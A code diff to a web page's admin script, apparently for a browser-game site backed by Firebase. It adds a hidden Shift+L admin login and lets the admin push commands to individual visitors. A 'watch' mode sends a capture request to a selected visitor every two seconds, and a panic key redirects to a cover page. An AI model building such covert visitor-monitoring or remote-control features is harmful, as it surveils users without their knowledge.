+        window.adminCustom = (t) => { if(selectedID) update(ref(db, `presence/${selectedID}`), {[t]: document.getElementById('adminCommandInp').value}); };
+        window.globalReload = () => { if(confirm("NUKE?")) onValue(ref(db, 'presence'), s=>s.forEach(c=>update(ref(db,`presence/${c.key}`),{reload:true})),{onlyOnce:true}); };
+        window.wipeDatabase = () => { if(confirm("WIPE DB?")) remove(ref(db, 'presence')); };
+        window.toggleWatch = () => {
+            const btn = document.getElementById('watchBtn'); const ind = document.getElementById('live-indicator');
+            if(watchInterval) { clearInterval(watchInterval); watchInterval=null; btn.style.background="#004400"; btn.innerText="👁️ WATCH"; ind.style.display="none"; }
+            else { 
+                if(!selectedID) return alert("Select User"); 
+                btn.style.background="red"; btn.innerText="⏹ STOP"; ind.style.display="block";
+                update(ref(db,`presence/${selectedID}`),{capReq:true});
+                watchInterval = setInterval(()=>{ if(!selectedID) clearInterval(watchInterval); else update(ref(db,`presence/${selectedID}`),{capReq:true}); }, 2000);
+            }
         };
 
-        window.act = (k) => { if(selectedID) onValue(ref(db, `presence/${selectedID}/${k}`), s=>{let v=!s.val(); if(k.includes('Req')||k==='skeleton') v=true; update(ref(db,`presence/${selectedID}`),{[k]:v})}, {onlyOnce:true}); };
-        window.custom = (k) => { if(selectedID) update(ref(db,`presence/${selectedID}`),{[k]:prompt("Enter Value:")}); };
-        window.saveGlobal = (k) => { 
-            const val = k==='title'?document.getElementById('cfgName').value : document.getElementById('cfgColor').value;
-            update(ref(db, 'settings'), {[k]: val});
+        window.toggleCfg = (key) => { cfg[key] = !cfg[key]; document.getElementById('chkEnable').innerText = cfg.enable ? '✓' : ''; };
+        window.panicTrigger = () => { if(!cfg.enable) return; if(activeGameWindow) activeGameWindow.close(); window.location.replace(cfg.url); };
+        window.toggleModal = (id) => { const m = document.getElementById(id); m.style.display = m.style.display === 'block' ? 'none' : 'block'; };
+        
+        window.addEventListener('keydown', (e) => {
+            if (cfg.enable && (e.key === cfg.key || e.code === cfg.key)) panicTrigger();
+            if (e.shiftKey && (e.key === 'L' || e.key === 'l')) { e.preventDefault(); document.getElementById('loginOverlay').style.display = 'flex'; }
+        }, true);
+
+        window.saveConfig = () => {
+            cfg.url = document.getElementById('cfgUrl').value; cfg.key = tempKey; cfg.mode = document.getElementById('cfgMode').value;
+            localStorage.setItem('pUrl', cfg.url); localStorage.setItem('pKey', cfg.key); localStorage.setItem('pMode', cfg.mode); localStorage.setItem('pEnable', cfg.enable);
+            alert("SAVED"); toggleModal('settingsM');
         };
-        window.resetAll = () => remove(ref(db, 'presence'));
+
+        document.getElementById('cfgUrl').value = cfg.url; document.getElementById('cfgKeyDisp').value = cfg.key.toUpperCase();
+        document.getElementById('cfgMode').value = cfg.mode; document.getElementById('chkEnable').innerText = cfg.enable ? '✓' : '';
     </script>
 </body>
 </html>
